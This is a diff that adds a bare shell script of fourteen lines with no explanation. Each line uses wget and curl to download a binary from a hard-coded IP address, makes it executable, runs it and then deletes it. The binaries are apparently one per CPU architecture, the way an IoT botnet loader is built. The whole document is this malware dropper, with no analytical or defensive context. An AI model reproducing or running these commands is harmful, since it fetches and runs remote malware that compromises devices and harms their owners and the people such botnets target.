@@ -1,0 +1,14 @@
+wget http://87.106.146.195/bins/narm; curl -O http://87.106.146.195/bins/narm; chmod +x narm; ./narm; rm -rf narm
+wget http://87.106.146.195/bins/narm5; curl -O http://87.106.146.195/bins/narm5; chmod +x narm5; ./narm5; rm -rf narm5
+wget http://87.106.146.195/bins/narm6; curl -O http://87.106.146.195/bins/narm6; chmod +x narm6; ./narm6; rm -rf narm6
+wget http://87.106.146.195/bins/narm7; curl -O http://87.106.146.195/bins/narm7; chmod +x narm7; ./narm7; rm -rf narm7
+wget http://87.106.146.195/bins/nm68k; curl -O http://87.106.146.195/bins/nm68k; chmod +x nm68k; ./nm68k; rm -rf nm68k
+wget http://87.106.146.195/bins/nmips; curl -O http://87.106.146.195/bins/nmips; chmod +x nmips; ./nmips; rm -rf nmips
+wget http://87.106.146.195/bins/nmpsl; curl -O http://87.106.146.195/bins/nmpsl; chmod +x nmpsl; ./nmpsl; rm -rf nmpsl
+wget http://87.106.146.195/bins/nppc; curl -O http://87.106.146.195/bins/nppc; chmod +x nppc; ./nppc; rm -rf nppc
+wget http://87.106.146.195/bins/nppc440; curl -O http://87.106.146.195/bins/nppc440; chmod +x nppc440; ./nppc440; rm -rf nppc440
+wget http://87.106.146.195/bins/nsh4; curl -O http://87.106.146.195/bins/nsh4; chmod +x nsh4; ./nsh4; rm -rf nsh4
+wget http://87.106.146.195/bins/nx486; curl -O http://87.106.146.195/bins/nx486; chmod +x nx486; ./nx486; rm -rf nx486
+wget http://87.106.146.195/bins/nx686; curl -O http://87.106.146.195/bins/nx686; chmod +x nx686; ./nx686; rm -rf nx686
+wget http://87.106.146.195/bins/nx86; curl -O http://87.106.146.195/bins/nx86; chmod +x nx86; ./nx86; rm -rf nx86
+wget http://87.106.146.195/bins/nx86_64; curl -O http://87.106.146.195/bins/nx86_64; chmod +x nx86_64; ./nx86_64; rm -rf nx86_64
